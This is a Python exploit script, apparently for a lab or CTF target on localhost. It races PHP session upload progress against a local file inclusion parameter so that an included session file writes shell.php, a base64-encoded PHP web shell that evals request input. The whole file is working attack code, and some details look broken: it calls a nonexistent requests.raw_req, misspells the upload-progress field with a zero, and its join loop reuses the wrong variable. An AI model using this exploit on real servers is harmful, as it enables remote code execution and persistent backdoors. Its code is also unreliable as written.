import requests
import threading
import socket

def get_payload():
    url = "http://127.0.0.1:12345/index.php"
    webshell = "SECURITY<?php file_put_contents('shell.php',base64_decode('PD9waHAgZXZhbCgkX1JFUVVFU1RbImNvZGUiXSk7Pz4='));?>"
    params = {"file":"/var/lib/php/sessions/sess_shell"}
    files = {"PHP_SESSI0N_UPLOAD_PROGRESS":(None,"aa"),"a":(webshell,"a")}
    cookies = {"PHPSESSID":"shell"}
    resp = requests.post(url,cookies=cookies,params=params,files=files,timeout=2)
    return requests.raw_req(resp)


class Worker(threading.Thread):
    def __init__(self, event, payload):
        super().__init__()
        self.event = event
        self.payload = payload
    def run(self):
        while not self.event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(("127.0.0.1",12345))
                s.send(self.payload.encode("utf-8"))
                r = s.recv(0x1000)
                # with open("r.txt","ab") as f:
                #     f.write(r)
                if b"SECURITY" in r:
                    self.event.set()
                    print("[+] Get shell !!!")
                s.close()
            except:
                pass

if __name__ == "__main__":
    event = threading.Event()
    event.clear()
    tp = []
    payload = get_payload().replace("gzip, deflate","identity")
    for i in range(10):
        t = Worker(event,payload)
        tp.append(t)
    for t in tp:
        t.start()
    for i in tp:
        t.join()
